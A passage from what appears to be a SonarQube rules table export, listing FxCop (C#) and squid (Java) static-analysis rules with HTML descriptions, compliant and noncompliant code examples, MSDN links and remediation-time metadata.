Y.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the method does not require the security specified by the type. However, this is not an ordinary scenario and might indicate a need for a careful design review.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182304.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182304.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806659	1511453806659	1
256	CA1405: COM visible type base types should be COM visible	ComVisibleTypeBaseTypesShouldBeComVisible	CA1405	fxcop	<h2>Cause</h2>\n<p>\n            A Component Object Model (COM) visible type derives from a type that is not COM visible.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a COM visible type adds members in a new version, it must abide by strict guidelines to avoid breaking COM clients that bind to the current version. A type that is invisible to COM presumes it does not have to follow these COM versioning rules when it adds new members. However, if a COM visible type derives from the COM invisible type and exposes a class interface of <code>ClassInterfaceType.AutoDual</code> or <code>AutoDispatch</code> (the default), all public members of the base type (unless they are specifically marked as COM invisible, which would be redundant) are exposed to COM. If the base type adds new members in a subsequent version, any COM clients that bind to the class interface of the derived type might break. COM visible types should derive only from COM visible types to reduce the chance of breaking COM clients.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the base types COM visible or the derived type COM invisible.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182202.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182202.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806661	1511453806661	1
257	CA1713: Events should not have before or after prefix	EventsShouldNotHaveBeforeOrAfterPrefix	CA1713	fxcop	<h2>Cause</h2>\n<p>\n            The name of an event starts with 'Before' or 'After'.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Event names should describe the action that raises the event. To name related events that are raised in a specific sequence, use the present or past tense to indicate the relative position in the sequence of actions. For example, when naming a pair of events that is raised when closing a resource, you might name it 'Closing' and 'Closed', instead of 'BeforeClose' and 'AfterClose'.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove the prefix from the event name, and consider changing the name to use the present or past tense of a verb.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182238.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182238.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806662	1511453806662	1
258	CA1703: Resource strings should be spelled correctly	ResourceStringsShouldBeSpelledCorrectly	CA1703	fxcop	<h2>Cause</h2>\n<p>\n            A resource string contains one or more words that are not recognized by the Microsoft spelling checker library.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule parses the resource string into words (tokenizing compound words) and checks the spelling of each word/token. For information about the parsing algorithm, see CA1704: Identifiers should be spelled correctly.\n            By default, the English (en) version of the spelling checker is used.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, use complete words that are correctly spelled or add the words to a custom dictionary. For information about how to use custom dictionaries, see CA1704: Identifiers should be spelled correctly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Correctly spelled words reduce the time that is required to learn new software libraries.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1701: Resource string compound words should be cased correctly\n\n\n\n\n                CA1704: Identifiers should be spelled correctly\n\n\n\n\n                CA2204: Literals should be spelled correctly\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264483.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264483.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806663	1511453806665	1
259	CA1047: Do not declare protected members in sealed types	DoNotDeclareProtectedMembersInSealedTypes	CA1047	fxcop	<h2>Cause</h2>\n<p>\n            A public type is <code>sealed</code> (<code>NotInheritable</code> in Visual basic) and declares a protected member or a protected nested type. This rule does not report violations for <code>Finalize</code> methods, which must follow this pattern.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types declare protected members so that inheriting types can access or override the member. By definition, you cannot inherit from a sealed type, which means that protected methods on sealed types cannot be called.\n            The C# compiler issues a warning for this error.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the access level of the member to private, or make the type inheritable.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Leaving the type in its current state can cause maintenance issues and does not provide any benefits.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182138.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182138.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806665	1511453806666	1
504	"compareTo" should not return "Integer.MIN_VALUE"	S2167	S2167	squid	<p>It is the sign, rather than the magnitude of the value returned from <code>compareTo</code> that matters. Returning <code>Integer.MIN_VALUE</code> does not convey a higher degree of inequality, and doing so can cause errors because the return value of <code>compareTo</code> is sometimes inversed, with the expectation that negative values become positive. However, inversing <code>Integer.MIN_VALUE</code> yields <code>Integer.MIN_VALUE</code> rather than <code>Integer.MAX_VALUE</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int compareTo(MyClass) {\n  if (condition) {\n    return Integer.MIN_VALUE;  // Noncompliant\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int compareTo(MyClass) {\n  if (condition) {\n    return -1;\n  }\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807025	1511453807025	2
505	Nested code blocks should not be used	S1199	S1199	squid	<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void evaluate(int operator) {\n  switch (operator) {\n    /* ... */\n    case ADD: {                                // Noncompliant - nested code block '{' ... '}'\n        int a = stack.pop();\n        int b = stack.pop();\n        int result = a + b;\n        stack.push(result);\n        break;\n      }\n    /* ... */\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic void evaluate(int operator) {\n  switch (operator) {\n    /* ... */\n    case ADD:                                  // Compliant\n      evaluateAdd();\n      break;\n    /* ... */\n  }\n}\n\nprivate void evaluateAdd() {\n  int a = stack.pop();\n  int b = stack.pop();\n  int result = a + b;\n  stack.push(result);\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453807026	1511453807026	1
260	CA1725: Parameter names should match base declaration	ParameterNamesShouldMatchBaseDeclaration	CA1725	fxcop	<h2>Cause</h2>\n<p>\n            The name of a parameter in an externally visible method override does not match the name of the parameter in the base declaration of the method, or the name of the parameter in the interface declaration of the method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Consistent naming of parameters in an override hierarchy increases the usability of the method overrides. A parameter name in a derived method that differs from the name in the base declaration can cause confusion about whether the method is an override of the base method or a new overload of the method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, rename the parameter to match the base declaration. The fix is a breaking change for COM visible methods.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule except for COM visible methods in libraries that have previously shipped.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182251.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182251.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806666	1511453806667	1
261	CA1414: Mark boolean P/Invoke arguments with MarshalAs	MarkBooleanPInvokeArgumentsWithMarshalAs	CA1414	fxcop	<h2>Cause</h2>\n<p>\n            A platform invoke method declaration includes a <code>System.Boolean</code> parameter or return value but the <code>System.Runtime.InteropServices.MarshalAsAttribute</code> attribute is not applied to the parameter or return value.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code>. <code>MarshalAsAttribute</code> specifies the marshaling behavior that is used to convert data types between managed and unmanaged code. Many simple data types, such as <code>System.Byte</code> and System.Int32, have a single representation in unmanaged code and do not require specification of their marshaling behavior; the common language runtime automatically supplies the correct behavior.\n            The <code>Boolean</code> data type has multiple representations in unmanaged code. When the <code>MarshalAsAttribute</code> is not specified, the default marshaling behavior for the <code>Boolean</code> data type is <code>UnmanagedType.Bool</code>. This is a 32-bit integer, which is not appropriate in all circumstances. The Boolean representation that is required by the unmanaged method should be determined and matched to the appropriate <code>System.Runtime.InteropServices.UnmanagedType</code>. UnmanagedType.Bool is the Win32 BOOL type, which is always 4 bytes. UnmanagedType.U1 should be used for C++ bool or other 1-byte types. For more information, see Default Marshaling for Boolean Types.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, apply <code>MarshalAsAttribute</code> to the <code>Boolean</code> parameter or return value. Set the value of the attribute to the appropriate <code>UnmanagedType</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Even if the default marshaling behavior is appropriate, the code is more easily maintained when the behavior is explicitly specified.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:PInvokeDeclarationsShouldBePortable}<br/>\n\n\n\n\n                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182206.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182206.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806668	1511453806669	1
262	CA2208: Instantiate argument exceptions correctly	InstantiateArgumentExceptionsCorrectly	CA2208	fxcop	<h2>Cause</h2>\n<p>\n            Possible causes include the following situations:\n            <ul>\n              <li>\n                A call is made to the default (parameterless) constructor of an exception type that is, or derives from [System.ArgumentException].\n              </li>\n              <li>\n                An incorrect string argument is passed to a parameterized constructor of an exception type that is, or derives from [System.ArgumentException.]\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            Instead of calling the default constructor, call one of the constructor overloads that allows a more meaningful exception message to be provided. The exception message should target the developer and clearly explain the error condition and how to correct or avoid the exception.\n            The signatures of the one and two string constructors of <code>ArgumentException</code> and its derived types are not consistent with respect to the message and paramName parameters. Make sure these constructors are called with the correct string arguments. The signatures are as follows:\n\n\n                <code>ArgumentException</code>\n              (string message)\n\n\n                <code>ArgumentException</code>\n              (string message, string paramName)\n\n\n                <code>ArgumentNullException</code>\n              (string paramName)\n\n\n                <code>ArgumentNullException</code>\n              (string paramName, string message)\n\n\n                <code>ArgumentOutOfRangeException</code>\n              (string paramName)\n\n\n                <code>ArgumentOutOfRangeException</code>\n              (string paramName, string message)\n\n\n                <code>DuplicateWaitObjectException</code>\n              (string parameterName)\n\n\n                <code>DuplicateWaitObjectException</code>\n              (string parameterName, string message)\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call a constructor that takes a message, a parameter name, or both, and make sure the arguments are proper for the type of <code>ArgumentException</code> being called.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule only if a parameterized constructor is called with the correct string arguments.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182347.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182347.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806670	1511453806670	1
263	CA1012: Abstract types should not have constructors	AbstractTypesShouldNotHaveConstructors	CA1012	fxcop	<h2>Cause</h2>\n<p>\n            A public type is abstract and has a public constructor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Constructors on abstract types can be called only by derived types. Because public constructors create instances of a type, and you cannot create instances of an abstract type, an abstract type that has a public constructor is incorrectly designed.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, either make the constructor protected or do not declare the type as abstract.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. The abstract type has a public constructor.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182126.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182126.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806671	1511453806671	1
264	CA2126: Type link demands require inheritance demands	TypeLinkDemandsRequireInheritanceDemands	CA2126	fxcop	<h2>Cause</h2>\n<p>\n            A public unsealed type is protected with a link demand, has an overridable method, and neither the type nor the method is protected with an inheritance demand.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A link demand on a method or its declaring type requires the immediate caller of the method to have the specified permission. An inheritance demand on a method requires an overriding method to have the specified permission. An inheritance demand on a type requires a deriving class to have the specified permission.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, secure the type or the method with an inheritance demand for the same permission as the link demand.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ReviewDeclarativeSecurityOnValueTypes}<br/>\n\n\n\n\n                {rule:fxcop:SecuredTypesShouldNotExposeFields}<br/>\n\n\n\n\n                {rule:fxcop:DoNotIndirectlyExposeMethodsWithLinkDemands}<br/>\n\n\n\n\n                {rule:fxcop:OverrideLinkDemandsShouldBeIdenticalToBase}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182321.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182321.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806672	1511453806673	1
265	CA1819: Properties should not return arrays	PropertiesShouldNotReturnArrays	CA1819	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected property in a public type returns an array.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Arrays returned by properties are not write-protected, even if the property is read-only. To keep the array tamper-proof, the property must return a copy of the array. Typically, users will not understand the adverse performance implications of calling such a property. Specifically, they might use the property as an indexed property.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, either make the property a method or change the property to return a collection.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Attributes can contain properties that return arrays, but cannot contain properties that return collections. You can suppress a warning that is raised for a property of an attribute that is derived from the [System.Attribute] class. Otherwise, do not suppress a warning from this rule.\n</p>\n<h2>Example Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a property that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace PerformanceLibrary\n{\n    public class Book\n    {\n        private string[] _Pages;\n\n        public Book(string[] pages)\n        {\n            _Pages = pages;\n        }\n\n        public string[] Pages\n        {\n            get { return _Pages; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                To fix a violation of this rule, either make the property a method or change the property to return a collection instead of an array.\n</p>\n<h2>Change the Property to a Method Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the violation by changing the property to a method.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace PerformanceLibrary\n{\n    public class Book\n    {\n        private string[] _Pages;\n\n        public Book(string[] pages)\n        {\n            _Pages = pages;\n        }\n\n        public string[] GetPages()\n        {\n            // Need to return a clone of the array so that consumers             \n            // of this library cannot change its contents             \n            return (string[])_Pages.Clone();\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Return a Collection Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the violation by changing the property to return a\n\n                  ReadOnlyCollection.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Collections.ObjectModel;\n\nnamespace PerformanceLibrary\n{\n    public class Book\n    {\n        private ReadOnlyCollection&lt;string&gt; _Pages;\n        public Book(string[] pages)\n        {\n            _Pages = new ReadOnlyCollection&lt;string&gt;(pages);\n        }\n\n        public ReadOnlyCollection&lt;string&gt; Pages\n        {\n            get { return _Pages; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Allowing Users to Modify a Property</h2>\n\n<h3>Description</h3>\n<p>\n                You might want to allow the consumer of the class to modify a property. The following example shows a read/write property that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace PerformanceLibrary\n{\n    public class Book\n    {\n        private string[] _Pages;\n\n        public Book(string[] pages)\n        {\n            _Pages = pages;\n        }\n\n        public string[] Pages\n        {\n            get { return _Pages; }\n            set { _Pages = value; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                The following example fixes the violation by changing the property to return a Collection.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Collections.ObjectModel;\n\nnamespace PerformanceLibrary\n{\n    public class Book\n    {\n        private Collection&lt;string&gt; _Pages;\n\n        public Book(string[] pages)\n        {\n            _Pages = new Collection&lt;string&gt;(pages);\n        }\n\n        public Collection&lt;string&gt; Pages\n        {\n            get { return _Pages; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:UsePropertiesWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/0fss9skc.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/0fss9skc.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806673	1511453806674	1
528	Ints and longs should not be shifted by more than their number of bits-1	S2183	S2183	squid	<p>Since an <code>int</code> is a 32-bit variable, shifting by more than (-)31 is confusing at best and an error at worst. Shifting an <code>int</code> by 32 is the same as shifting it by 0, and shifting it by 33 is the same as shifting it by 1.</p>\n\n<p>Similarly, shifting a <code>long</code> by (-)64 is the same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int shift(int a) {\n  return a << 48;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic int shift(int a) {\n  return a << 16;\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807058	1511453807058	2
529	"readResolve" methods should be inheritable	S2062	S2062	squid	<p>The <code>readResolve()</code> method allows final tweaks to the state of an object during deserialization. Non-final classes which implement <code>readResolve()</code>, should not set its visibility to <code>private</code> since it will then be unavailable to child classes.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit implements Serializable { \n  private static final long serialVersionUID = 1;\n\n  private Object readResolve() throws ObjectStreamException  // Noncompliant\n  {...}\n\n  //...\n}\n\npublic class Raspberry extends Fruit implements Serializable {  // No access to parent's readResolve() method\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit implements Serializable { \n  private static final long serialVersionUID = 1;\n\n  protected Object readResolve() throws ObjectStreamException\n  {...}\n\n  //...\n}\n\npublic class Raspberry extends Fruit implements Serializable {\n  //...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807059	1511453807059	1
679	Dependencies should not have "system" scope	S3422	S3422	squid	<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact in an environment that's not configured just like yours is, your code won't work. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;dependency&gt;\n  &lt;groupId&gt;javax.sql&lt;/groupId&gt;\n  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;\n  &lt;version&gt;2.0&lt;/version&gt;\n  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;\n  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;\n&lt;/dependency&gt;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	lock-in,maven	f	HTML	1511453807214	1511453807215	1
266	CA2236: Call base class methods on ISerializable types	CallBaseClassMethodsOnISerializableTypes	CA2236	fxcop	<h2>Cause</h2>\n<p>\n            A type derives from a type that implements the <code>System.Runtime.Serialization.ISerializable</code> interface, and one of the following conditions is true:\n            <ul>\n              <li>\n                The type implements the serialization constructor, that is, a constructor with the <code>System.Runtime.Serialization.SerializationInfo</code>, <code>System.Runtime.Serialization.StreamingContext</code> parameter signature, but does not call the serialization constructor of the base type.\n              </li>\n              <li>\n                The type implements the <code>ISerializable.GetObjectData</code> method but does not call the <code>GetObjectData</code> method of the base type.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            In a custom serialization process, a type implements the <code>GetObjectData</code> method to serialize its fields and the serialization constructor to de-serialize the fields. If the type derives from a type that implements the <code>ISerializable</code> interface, the base type <code>GetObjectData</code> method and serialization constructor should be called to serialize/de-serialize the fields of the base type. Otherwise, the type will not be serialized and de-serialized correctly. Note that if the derived type does not add any new fields, the type does not need to implement the <code>GetObjectData</code> method nor the serialization constructor or call the base type equivalents.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call the base type <code>GetObjectData</code> method or serialization constructor from the corresponding derived type method or constructor.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ImplementISerializableCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:MarkAllNonSerializableFields}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>\n\n\n\n\n                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182326.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182326.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806674	1511453806676	1
267	CA1031: Do not catch general exception types	DoNotCatchGeneralExceptionTypes	CA1031	fxcop	<h2>Cause</h2>\n<p>\n            A general exception such as <code>System.Exception</code> or <code>System.SystemException</code> is caught in a <code>catch</code> statement, or a general catch clause such as catch() is used.\n</p>\n<h2>Rule Description</h2>\n<p>\n            General exceptions should not be caught.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, catch a more specific exception, or rethrow the general exception as the last statement in the <code>catch</code> block.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Catching general exception types can hide run-time problems from the library user and can make debugging more difficult.\n\n\n\n\n\n                    Note\n\n\n\n\n                    Starting with the .NET Framework 4, the common language runtime (CLR) no longer delivers corrupted state exceptions that occur in the operating system and managed code, such as access violations in Windows, to be handled by managed code. If you want to compile an application in the .NET Framework 4 or later versions and maintain handling of corrupted state exceptions, you can apply the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute to the method that handles the corrupted state exception.\n\n\n\n\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:RethrowToPreserveStackDetails}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182137.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182137.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806677	1511453806677	1
536	Multiple variables should not be declared on the same line	S1659	S1659	squid	<p>Declaring multiple variable on one line is difficult to read.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass MyClass {\n\n  private int a, b;\n\n  public void method(){\n    int c; int d;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n\n  private int a;\n  private int b;\n\n  public void method(){\n    int c;\n    int d;\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807065	1511453807065	1
537	The Object.finalize() method should not be called	ObjectFinalizeCheck	ObjectFinalizeCheck	squid	<p>According to the official javadoc documentation, this Object.finalize() is called by the garbage collector on an object when garbage collection determines that there are no more references to the object. Calling this method explicitly breaks this contract and so is misleading. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void dispose() throws Throwable {\n  this.finalize();                       // Noncompliant\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/586.html">MITRE, CWE-586</a> - Explicit Call to Finalize()</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/H4cbAQ">CERT, MET12-J</a> - Do not use finalizers</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe	f	HTML	1511453807065	1511453807066	3
538	"Serializable" inner classes of non-serializable classes should be "static"	S2066	S2066	squid	<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is not serializable, then serialization will fail, resulting in a runtime error.</p>\n\n<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible. However, you should be aware that there are semantic differences between an inner class and a nested one: \n<ul>\n  <li>an inner class can only be instantiated within the context of an instance of the outer class.</li>\n  <li>a nested (<code>static</code>) class can be instantiated independently of the outer class.</li>\n</ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Pomegranate {\n  // ...\n\n  public class Seed implements Serializable {  // Noncompliant; serialization will fail\n    // ...\n  }\n} \n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Pomegranate {\n  // ...\n\n  public static class Seed implements Serializable {\n    // ...\n  }\n} \n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	serialization	f	HTML	1511453807066	1511453807066	2
268	CA1062: Validate arguments of public methods	ValidateArgumentsOfPublicMethods	CA1062	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible method dereferences one of its reference arguments without verifying whether that argument is <code>null</code> (<code>Nothing</code> in Visual Basic).\n</p>\n<h2>Rule Description</h2>\n<p>\n            All reference arguments that are passed to externally visible methods should be checked against <code>null</code>. If appropriate, throw a <code>ArgumentNullException</code> when the argument is <code>null</code>.\n            If a method can be called from an unknown assembly because it is declared public or protected, you should validate all parameters of the method. If the method is designed to be called only by known assemblies, you should make the method internal and apply the <code>InternalsVisibleToAttribute</code>  attribute to the assembly that contains the method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, validate each reference argument against <code>null</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n             You can suppress a warning from this rule if you are sure that the dereferenced parameter has been validated by another method call in the function.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182182.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182182.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806678	1511453806679	1
